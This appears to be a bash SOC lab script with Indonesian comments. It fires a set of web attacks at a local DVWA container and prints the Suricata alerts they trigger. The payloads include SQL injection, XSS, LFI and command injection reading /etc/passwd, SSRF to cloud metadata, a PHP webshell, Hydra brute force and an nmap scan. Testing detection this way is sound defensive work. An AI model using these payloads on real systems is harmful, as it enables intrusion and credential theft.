#!/usr/bin/env bash

# ==============================================================================
# SOC COMPREHENSIVE ATTACK SIMULATOR & REAL-TIME MONITOR
# Script untuk mensimulasikan SEMUA jenis serangan yang terdeteksi di Grafana 
# (SQLi, XSS, SSRF, Evasion, Brute Force, Webshell) dan memantau log Suricata.
# ==============================================================================

# Warna untuk output terminal
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Konfigurasi Target
DVWA_URL="http://localhost:8080"
DVWA_IP=$(docker inspect dvwa --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' 2>/dev/null || echo "172.18.0.12")
EVE_LOG="./logs/suricata/eve.json"

echo -e "${CYAN}==============================================================================${NC}"
echo -e "${CYAN}   SOC COMPREHENSIVE ATTACK SIMULATOR & REAL-TIME MONITOR${NC}"
echo -e "${CYAN}==============================================================================${NC}"
echo -e "Target DVWA URL : ${YELLOW}${DVWA_URL}${NC}"
echo -e "Target DVWA IP  : ${YELLOW}${DVWA_IP}${NC}"
echo -e "Log File Monitor: ${YELLOW}${EVE_LOG}${NC}"
echo ""

# Fungsi untuk memutar serangan di background
run_attacks() {
    sleep 2 # Tunggu monitor siap

    echo -e "\n${YELLOW}[!] Menjalankan Serangan Lengkap...${NC}\n"

    # 1. SQL Injection (UNION SELECT)
    echo -e "${RED}[*] Attack 1: SQL Injection (UNION SELECT)${NC}"
    curl -s "${DVWA_URL}/vulnerabilities/sqli/?id=1'+UNION+SELECT+1,2--&Submit=Submit" -A "Mozilla/5.0" -o /dev/null
    sleep 1

    # 2. Cross-Site Scripting (XSS)
    echo -e "${RED}[*] Attack 2: Cross-Site Scripting (XSS)${NC}"
    curl -s "${DVWA_URL}/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E" -A "Mozilla/5.0" -o /dev/null
    sleep 1

    # 3. Path Traversal / LFI
    echo -e "${RED}[*] Attack 3: Path Traversal (LFI)${NC}"
    curl -s "${DVWA_URL}/vulnerabilities/fi/?page=../../../../etc/passwd" -A "Mozilla/5.0" -o /dev/null
    sleep 1

    # 4. Command Injection
    echo -e "${RED}[*] Attack 4: Command Injection${NC}"
    curl -s "${DVWA_URL}/vulnerabilities/exec/?ip=1;cat+/etc/passwd&Submit=Submit" -A "Mozilla/5.0" -o /dev/null
    sleep 1

    # 5. SSRF (Server-Side Request Forgery)
    echo -e "${RED}[*] Attack 5: SSRF (AWS Metadata & Localhost)${NC}"
    curl -s "${DVWA_URL}/?url=http://169.254.169.254/latest/meta-data/" -A "Mozilla/5.0" -o /dev/null
    curl -s "${DVWA_URL}/?url=http://127.0.0.1/admin" -A "Mozilla/5.0" -o /dev/null
    sleep 1

    # 6. Evasion Techniques (Obfuscation, Double Encoding, Base64)
    echo -e "${MAGENTA}[*] Attack 6: Evasion Techniques${NC}"
    # Double encoding Quote (%2527)
    curl -s "${DVWA_URL}/vulnerabilities/sqli/?id=1%2527+OR+1=1--" -A "Mozilla/5.0" -o /dev/null
    # SQL Comment Obfuscation (/**/)
    curl -s "${DVWA_URL}/vulnerabilities/sqli/?id=1'+un/**/ion+select+1--" -A "Mozilla/5.0" -o /dev/null
    # Base64 pipe bash
    curl -s "${DVWA_URL}/vulnerabilities/exec/?ip=1|echo+base64|bash" -A "Mozilla/5.0" -o /dev/null
    # PHP Eval Base64
    curl -s "${DVWA_URL}/vulnerabilities/exec/?ip=eval(base64_decode(XYZ))" -A "Mozilla/5.0" -o /dev/null
    sleep 1

    # 7. Webshell Upload (Simulasi POST request dengan <?php)
    echo -e "${RED}[*] Attack 7: PHP Webshell Upload${NC}"
    curl -s -X POST "${DVWA_URL}/vulnerabilities/upload/" -d "<?php system(\$_GET['cmd']); ?>" -A "Mozilla/5.0" -o /dev/null
    sleep 1

    # 8. Web Scanners (User-Agent Triggers)
    echo -e "${MAGENTA}[*] Attack 8: Web Scanner Probes${NC}"
    curl -s "${DVWA_URL}/" -A "sqlmap/1.7.8#stable" -o /dev/null
    curl -s "${DVWA_URL}/" -A "Mozilla/5.0 BurpSuite" -o /dev/null
    curl -s "${DVWA_URL}/" -A "OWASP ZAP Scanner" -o /dev/null
    curl -s "${DVWA_URL}/" -A "Nikto" -o /dev/null
    sleep 1

    # 9. Admin Login Brute Force menggunakan Real Hydra (Gentle mode)
    echo -e "${RED}[*] Attack 9: Admin Login Brute Force (Hydra - Low Intensity)${NC}"
    if command -v hydra &> /dev/null; then
        # List password yang sangat pendek agar tidak memberatkan server
        echo -e "123456\nadmin123\npassword\nqwerty" > /tmp/soc_passwords.txt
        # Eksekusi Hydra dengan single thread (-t 1) agar lambat dan aman
        hydra -l admin -P /tmp/soc_passwords.txt $DVWA_IP http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 1 > /dev/null 2>&1
    else
        echo -e "${YELLOW}Hydra tidak ditemukan. Menjalankan fallback curl...${NC}"
        for i in {1..6}; do
            curl -s -X POST "${DVWA_URL}/login.php" -d "username=admin&password=password${i}&Login=Login" -A "Hydra" -o /dev/null
        done
    fi
    sleep 1

    # 10. Nmap Port Scan (SYN Stealth Scan ke Docker Bridge)
    echo -e "${RED}[*] Attack 10: Nmap Port Scan (Real Scan)${NC}"
    if command -v nmap &> /dev/null; then
        # -sS (SYN Scan) biasanya akan mentrigger rule ET SCAN NMAP SYN Scan
        nmap -sS -p 21,22,80,443,3306,8080 -T4 -Pn $DVWA_IP > /dev/null 2>&1
    else
        echo -e "${YELLOW}Nmap tidak ditemukan. Menjalankan fallback netcat...${NC}"
        nc -z -w 1 $DVWA_IP 80 2>/dev/null
        nc -z -w 1 $DVWA_IP 443 2>/dev/null
        nc -z -w 1 $DVWA_IP 3306 2>/dev/null
    fi
    sleep 2

    echo -e "\n${GREEN}[✓] Semua serangan selesai dieksekusi.${NC}"
    echo -e "${YELLOW}[!] Tekan Ctrl+C untuk keluar dari monitor log.${NC}\n"
}

# Jalankan serangan di background
run_attacks &
ATTACK_PID=$!

# Pastikan file log ada
if [ ! -f "$EVE_LOG" ]; then
    echo -e "${RED}Error: File log Suricata ($EVE_LOG) tidak ditemukan!${NC}"
    echo "Pastikan Anda berada di direktori soc_project dan container suricata berjalan."
    kill $ATTACK_PID 2>/dev/null
    exit 1
fi

echo -e "${GREEN}[*] Mulai memantau log Suricata secara real-time...${NC}"
echo -e "${CYAN}Format: [WAKTU] | ALERT | SIGNATURE | SRC_IP -> DEST_IP${NC}"
echo "------------------------------------------------------------------------------"

# Monitor log secara real-time menggunakan tail dan jq/grep/python
tail -F "$EVE_LOG" | grep --line-buffered '"event_type":"alert"' | python3 -c "
import sys, json
from datetime import datetime

# ANSI colors
RED = '\033[0;31m'
YELLOW = '\033[1;33m'
CYAN = '\033[0;36m'
MAGENTA = '\033[0;35m'
NC = '\033[0m'

for line in sys.stdin:
    try:
        data = json.loads(line)
        if data.get('event_type') == 'alert':
            timestamp = data.get('timestamp', '')[:19].replace('T', ' ')
            src_ip = data.get('src_ip', '')
            dest_ip = data.get('dest_ip', '')
            signature = data.get('alert', {}).get('signature', 'Unknown Alert')
            severity = data.get('alert', {}).get('severity', 0)

            # Warna berdasarkan severity
            if severity == 1:
                color = RED
            elif severity == 2:
                color = YELLOW
            else:
                color = CYAN
                
            # Highlight khusus evasion
            if 'EVASION' in signature:
                color = MAGENTA
            
            print(f'[{timestamp}] | {color}ALERT (Sev:{severity}){NC} | {color}{signature}{NC} | {src_ip} -> {dest_ip}')
            sys.stdout.flush()
    except Exception as e:
        pass
"

# Menangkap Ctrl+C untuk mematikan background process
trap "kill $ATTACK_PID 2>/dev/null; exit" INT
wait $ATTACK_PID
